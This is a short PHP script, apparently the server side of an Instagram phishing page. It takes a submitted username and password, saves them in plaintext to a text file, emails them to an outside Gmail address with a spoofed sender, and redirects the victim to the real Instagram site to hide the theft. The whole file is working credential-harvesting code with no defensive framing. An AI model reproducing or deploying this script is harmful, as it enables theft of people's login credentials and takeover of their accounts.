<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Obtener los datos del formulario
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Guardar los datos en un archivo .txt
    $file = fopen("Carlanga.txt", "a");
    fwrite($file, "Username/Email: " . $username . "\n");
    fwrite($file, "Password: " . $password . "\n");
    fwrite($file, "-------------------------\n");
    fclose($file);

    // Enviar el correo electrónico
    $to = "carlangam.j@gmail.com";
    $subject = "New Login Attempt";
    $message = "Username/Email: " . $username . "\nPassword: " . $password;
    $headers = "From: no-reply@yourwebsite.com";

    // Enviar correo
    mail($to, $subject, $message, $headers);

    // Redirigir a Instagram
    header("Location: https://www.instagram.com/");
    exit();
}
?>